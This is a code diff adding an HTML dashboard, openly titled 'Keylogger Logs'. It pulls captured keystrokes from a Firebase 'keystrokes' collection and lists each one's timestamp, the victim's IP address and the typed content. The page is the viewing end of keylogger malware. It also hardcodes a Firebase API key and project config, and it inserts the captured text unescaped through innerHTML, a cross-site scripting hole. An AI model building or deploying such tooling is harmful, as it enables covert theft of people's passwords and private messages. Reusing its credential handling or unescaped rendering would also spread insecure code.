@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Keylogger Logs</title>
+    <script src="https://www.gstatic.com/firebasejs/9.24.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.24.0/firebase-firestore-compat.js"></script>
+    <style>
+        body {
+            font-family: Arial;
+            padding: 20px;
+            background: #f9f9f9;
+        }
+
+        table {
+            border-collapse: collapse;
+            width: 100%;
+        }
+
+        th,
+        td {
+            padding: 8px;
+            border: 1px solid #ccc;
+        }
+
+        th {
+            background: #eee;
+        }
+    </style>
+</head>
+
+<body>
+    <h2>🧠 Keylogger Logs</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>Timestamp</th>
+                <th>IP Address</th>
+                <th>Content</th>
+            </tr>
+        </thead>
+        <tbody id="logTable">
+        </tbody>
+    </table>
+
+    <script>
+        // ✅ Replace with your Firebase config
+        const firebaseConfig = {
+            apiKey: "AIzaSyCkkZrIRab9OpGNWyJ2AndcyBWUThRe4W4",
+            authDomain: "farmerproject-106b6.firebaseapp.com",
+            databaseURL: "https://farmerproject-106b6-default-rtdb.firebaseio.com",
+            projectId: "farmerproject-106b6",
+            storageBucket: "farmerproject-106b6.appspot.com",
+            messagingSenderId: "283290270343",
+            appId: "1:283290270343:web:a58b814baa056295505622"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        db.collection("keystrokes").orderBy("timestamp", "desc").onSnapshot(snapshot => {
+            const table = document.getElementById("logTable");
+            table.innerHTML = "";
+            snapshot.forEach(doc => {
+                const data = doc.data();
+                const row = `<tr>
+          <td>${new Date(data.timestamp.seconds * 1000).toLocaleString()}</td>
+          <td>${data.ip || "N/A"}</td>
+          <td>${data.content}</td>
+        </tr>`;
+                table.innerHTML += row;
+            });
+        });
+    </script>
+</body>
+
+</html>
